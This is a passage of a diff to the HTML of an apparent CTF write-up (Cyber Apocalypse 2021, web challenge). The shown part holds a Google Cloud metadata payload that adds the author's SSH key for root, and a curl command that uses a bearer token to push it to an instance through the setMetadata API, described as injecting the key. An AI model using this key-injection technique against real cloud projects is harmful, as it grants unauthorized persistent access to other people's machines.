+<span class="w">    </span><span class="ss">"items"</span><span class="err">:</span><span class="w"> </span><span class="o">[</span><span class="n"></span>
+<span class="n">      {</span>
+<span class="n">        "key": "sshKeys",</span>
+<span class="n">        "value": "root:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQD0fVPxASQe90gLUXWjnCjJsLOsUMw/mPTOCdJzM0IeM/EBFOYPeuF2bR2f/8FKkhX5WOGnvoWReCLKHV5xz7kwq63E9JU5I3vfObsEd5R3glyf7wEPOB0+/gaebldTERAlMDcTOlRwbYD+JILUrlqWGIskt/pcPP3TWeu2STErxcdQaJQc+5cZlOzLLPeKNQUel3otqIV4Bwr914uAuy3fe3gpLH2irEyPByQdpanyhiZZXIAdlPcR5E9AEosRHPmSBA9pn+O3/V7pfBND1V04q4AGrXMuLaDw019A7Xc1fSE2j3zWB5/FgEtYoKnI81BHPOQCqtAZ941kzdF4Zs3X/DrVraYEHD13yRtCmogrj0Iot1R4ABkUXEPLyNkqgYQV55vag9caUUwJUxU2AhldHK1NVErVndCTwu6VNBLgaJJy8iiln4EIBB3Ynb5qTsC/xKYLCjF1+2NxDeGMrrF7c5lwIUJzZIF2P+Rn2V2NDpEHOsJXsSpsGPBgxHbGDj0= jusepe@nix\nunknown1:ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRnJrXGPgJi3sAmmtOIL1yiorFOQ4U9CIsI0OWds7izDtsPWXvinIQOpqxxWRXwdKc0Ye3vCN1L9imjmQ0ILN0UEQsCmZfxrlYBFsS8VpJbIwkewFSRTMirZ4IFN84twVWRHJiFZ0RGzIDlW8q/XA16iUygiS+ehGl/SyA9DwZwWZfLDRLkvj8O+widR6qlTu9juANWxO8klwsk06qilQ/k2y1dCzAI0LNGybmLHonaqJY35E80xSzZHPFDQIDSM1gYtGkcuiVGCE3VufdVhZHqGSI1L4MlPmjEnRlRGhINsoWl6eI0Ltw+QUdTh+zrQJvPhFg3NDbTILmRdL/m2LpxxQ9vG7pZmB41uRmkm+4UZgLPZiQGSWVaosbYADWXB6DXTBpMW5jatwtUtI3oiM6SdfC4DIdU/tlQ/L30MMhuds/V7om/izbxYGh2oKFgnVYGr5d5c3cMHTNfr8kjdn+TDQnEyRlBxUIOMd5pff4pzfyP4Pxorz03ZoEUruI4J8= unknown1@Macbook-makelaris.local"</span>
+<span class="n">      }</span>
+<span class="n">    </span><span class="o">]</span><span class="p">,</span><span class="w"></span>
+<span class="w">    </span><span class="ss">"kind"</span><span class="err">:</span><span class="w"> </span><span class="ss">"compute#metadata"</span><span class="w"></span>
+<span class="w">  </span><span class="err">}</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  Finally, to inject my public SSH key I used the following
  <code>
@@ -1241,8 +1274,10 @@ print(payload)
  </code>
  command to update the metadata for SSH keys.
 </p>
-<pre class="codehilite"><code>curl -H "Authorization: Bearer &lt;access token&gt;" -H "Content-type: application/json" -d @payload.json https://compute.googleapis.com/compute/v1/projects/essential-hawk-310212/zones/us-central1-a/instances/instance-1/setMetadata
+<div class="codehilite">
+ <pre><span></span><code><span class="n">curl</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s2">"Authorization: Bearer &lt;access token&gt;"</span><span class="w"> </span><span class="o">-</span><span class="n">H</span><span class="w"> </span><span class="s2">"Content-type: application/json"</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="w"> </span><span class="err">@</span><span class="n">payload</span><span class="o">.</span><span class="n">json</span><span class="w"> </span><span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">compute</span><span class="o">.</span><span class="n">googleapis</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">compute</span><span class="o">/</span><span class="n">v1</span><span class="o">/</span><span class="n">projects</span><span class="o">/</span><span class="n">essential</span><span class="o">-</span><span class="n">hawk</span><span class="o">-</span><span class="mi">310212</span><span class="o">/</span><span class="n">zones</span><span class="o">/</span><span class="n">us</span><span class="o">-</span><span class="n">central1</span><span class="o">-</span><span class="n">a</span><span class="o">/</span><span class="n">instances</span><span class="o">/</span><span class="n">instance</span><span class="o">-</span><span class="mi">1</span><span class="o">/</span><span class="n">setMetadata</span><span class="w"></span>
 </code></pre>
+</div>
 <p>
  <img alt="" class="center" src="/images/writeups/cyber_apocalypse_2021/web/gcloud_upload_ssh.png"/>
 </p>
